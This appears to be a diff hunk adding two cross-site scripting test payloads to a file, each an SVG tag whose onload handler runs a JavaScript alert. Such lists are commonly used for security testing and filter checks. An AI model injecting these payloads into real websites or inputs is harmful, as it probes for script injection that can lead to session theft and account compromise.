@@ -1,0 +1,2 @@
+<svg/onload=alert(1)
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
